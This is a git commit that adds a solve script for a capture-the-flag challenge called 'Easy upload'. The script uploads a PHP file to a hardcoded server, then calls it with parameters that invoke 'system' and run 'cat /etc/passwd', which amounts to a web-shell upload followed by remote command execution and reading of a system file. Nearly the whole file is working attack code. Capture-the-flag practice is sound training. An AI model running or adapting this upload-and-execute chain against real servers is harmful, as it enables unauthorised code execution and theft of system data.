3a7b610720811aedec81e42f7b962744e0b0435d
Victor CUTILLAS <victor.cutillas@epitech.eu>
2018-03-10 16:10:03 +0100

    Easy upload

---
+++ upload-easy/solve.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+
+cd "$(dirname "${BASH_SOURCE[0]}")"
+
+FILENAME="7um3d3viner4sJam4is.php3"
+
+echo '[*] Uploading file'
+if ! curl -sk 'https://46.105.49.65/e3e138748147/' \
+     -F "fileToUpload=@${FILENAME}" \
+     -F 'submit=vic511' \
+	| grep -q 'has been moved to gallery.'
+then
+    echo '[-] Failed to upload file'
+    exit 1
+fi
+
+echo '[*] Retreiving flag'
+if ! curl -sk "https://46.105.49.65/e3e138748147/images/${FILENAME}?0=system&1=cat+/etc/passwd" \
+	| grep -aoE '[0-9a-f]{128}'
+then
+    echo '[-] Cannot retreive flag'
+    exit 1
+fi
